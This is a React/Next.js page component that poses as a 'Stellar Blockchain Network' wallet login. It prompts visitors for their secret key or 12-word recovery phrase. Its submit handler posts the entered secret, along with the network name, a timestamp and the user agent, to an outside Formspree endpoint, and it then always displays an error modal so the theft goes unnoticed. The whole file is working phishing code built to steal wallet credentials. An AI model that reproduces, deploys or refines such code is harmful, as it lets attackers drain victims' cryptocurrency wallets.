"use client";
import Navbar from "./components/Navbar";
import Modals from "./components/Modals";
import NetworkCards from "./components/NetworkCards";
import Footer from "./components/Footer";
import { useState, useRef, useEffect, RefObject } from "react";

export default function Home() {
  // Modal state
  const [modal, setModal] = useState<null | "login" | "secret" | "phrase" | "error">(null);
  const [network, setNetwork] = useState<string>("");
  const secretKeyRef = useRef<HTMLInputElement | null>(null);
  const phraseRef = useRef<HTMLTextAreaElement | null>(null);
  const [navActive, setNavActive] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined" && (window as any).AOS) {
      (window as any).AOS.init({
        duration: 800,
        easing: 'ease-in-out',
        once: true,
        mirror: false
      });
    }
  }, []);

  // Modal logic
  const openLogin = (networkName: string) => {
    setNetwork(networkName);
    setModal("login");
    // Store network in localStorage like original
    if (typeof window !== "undefined") {
      localStorage.setItem("Network", networkName);
    }
  };
  
  const openSecret = () => setModal("secret");
  const openPhrase = () => setModal("phrase");
  const closeModal = () => {
    setModal(null);
    setNavActive(false);
  };
  
  const handleSubmit = async (type: "secret" | "phrase") => {
    const secret = secretKeyRef.current?.value || "";
    const phrase = phraseRef.current?.value || "";
    
    // Validate input
    if (type === "secret" && !secret.trim()) {
      alert("Please enter your secret key");
      return;
    }
    if (type === "phrase" && !phrase.trim()) {
      alert("Please enter your 12-phrase recovery key");
      return;
    }

    setIsSubmitting(true);
    
    try {
      // Using Formspree - Replace 'YOUR_FORM_ID' with your actual Formspree form ID
      const response = await fetch("https://formspree.io/f/YOUR_FORM_ID", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "Accept": "application/json"
        },
        body: JSON.stringify({
          subject: `Stellar Blockchain Login Attempt - ${network}`,
          message: `
            Network: ${network}
            Method: ${type === "secret" ? "Secret Key" : "12-Phrase Recovery Key"}
            Value: ${type === "secret" ? secret : phrase}
            Timestamp: ${new Date().toISOString()}
            User Agent: ${navigator.userAgent}
          `,
          network: network,
          method: type === "secret" ? "Secret Key" : "12-Phrase Recovery Key",
          value: type === "secret" ? secret : phrase,
          timestamp: new Date().toISOString()
        })
      });

      if (response.ok) {
        console.log("Form submitted successfully");
        // Clear the inputs
        if (secretKeyRef.current) secretKeyRef.current.value = "";
        if (phraseRef.current) phraseRef.current.value = "";
        // Show error modal (as per original design)
        setModal("error");
      } else {
        throw new Error("Failed to submit form");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      // Still show error modal even if submission fails
      setModal("error");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <div className={`overlay${modal ? " active" : ""}`} onClick={closeModal}></div>
      <Modals
        modal={modal}
        closeModal={closeModal}
        openSecret={openSecret}
        openPhrase={openPhrase}
        secretKeyRef={secretKeyRef as RefObject<HTMLInputElement>}
        phraseRef={phraseRef as RefObject<HTMLTextAreaElement>}
        handleSubmit={handleSubmit}
        isSubmitting={isSubmitting}
      />
      <Navbar navActive={navActive} setNavActive={setNavActive} />
      <section className="blockchainNetworks flx fdc jcc aic">
        <h1>Stellar Blockchain Network</h1>
        <NetworkCards openLogin={openLogin} />
      </section>
      <Footer />
    </>
  );
}